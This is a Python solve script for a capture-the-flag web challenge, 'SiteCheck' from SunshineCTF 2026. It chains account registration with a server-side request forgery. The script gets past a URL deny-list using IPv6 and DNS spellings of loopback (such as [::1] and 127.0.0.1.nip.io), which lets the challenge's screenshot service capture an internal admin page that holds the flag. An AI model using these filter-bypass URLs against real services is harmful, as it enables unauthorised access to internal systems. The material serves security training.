#!/usr/bin/env python3
"""SiteCheck / SunshineCTF 2026 - solve up to the snapshot.

Chain:
  register inspector
  -> the deny-list refuses IPv4 loopback but accepts IPv6 forms of it
  -> scan http://[::1]:3000/profile#clearance
     (the internal Express instance serves loopback callers as its built-in
      admin / OMEGA inspector, and the #clearance anchor puts the flag plate
      inside the 1280x800 snapshot)
  -> download the snapshot and stop there: the flag is read from the picture by eye.

Set BASE to your own instance before running. Deps: requests
"""
import re
import secrets
import sys
import time
from pathlib import Path

import requests

BASE = "<challenge-url>"  # challenge instance (closed after the event)
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0"
OUTDIR = Path(".")

TARGET = "http://[::1]:3000/profile#clearance"
FALLBACKS = [
    "http://[0:0:0:0:0:0:0:1]:3000/profile#clearance",
    "http://[::ffff:127.0.0.1]:3000/profile#clearance",
    "http://127.0.0.1.nip.io:3000/profile#clearance",
]
BLOCKED_MARKER = "will not inspect internal or local addresses"
SNAPSHOT_RE = re.compile(r"/screenshots/([0-9a-f-]+)\.png")


def scan(s, target):
    """Submit one URL to the drone; return (blocked, snapshot_uuid, status)."""
    r = s.post(BASE + "/scan", data={"url": target}, timeout=60)
    body = r.text
    if BLOCKED_MARKER in body:
        return True, None, None
    img = SNAPSHOT_RE.search(body)
    status = re.search(r'Status</span><span class="v">([^<]*)', body)
    return False, (img.group(1) if img else None), (status.group(1).strip() if status else None)


def main() -> int:
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml",
        "Referer": BASE + "/dashboard",
    })

    # 1) enlist for a free inspector account
    callsign = "inspector_" + secrets.token_hex(4)
    r = s.post(BASE + "/register",
               data={"username": callsign, "password": secrets.token_urlsafe(12)},
               timeout=20, allow_redirects=True)
    if r.status_code != 200 or "Passphrase" in r.text:
        print("[!] registration failed - check BASE")
        return 1
    print("[+] registered inspector:", callsign)

    # 2) loopback spellings the deny-list does not catch
    for target in [TARGET] + FALLBACKS:
        blocked, snap, status = scan(s, target)
        if blocked:
            print("[-] filtered by the deny-list:", target)
            time.sleep(0.5)
            continue
        print("[+] filter bypassed:", target, "(status %s)" % status)
        if not snap:
            print("[!] no snapshot - target unreachable, trying the next spelling")
            time.sleep(0.5)
            continue

        # 3) save the drone snapshot - that is the whole payload
        png = OUTDIR / ("sitecheck_%s.png" % snap[:8])
        png.write_bytes(s.get("%s/screenshots/%s.png" % (BASE, snap), timeout=30).content)
        print("[+] snapshot saved:", png.resolve())
        print("[i] open it and read the clearance plate: the flag is right there in the picture")
        return 0

    print("[!] no snapshot - instance closed, or the internal port/route changed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
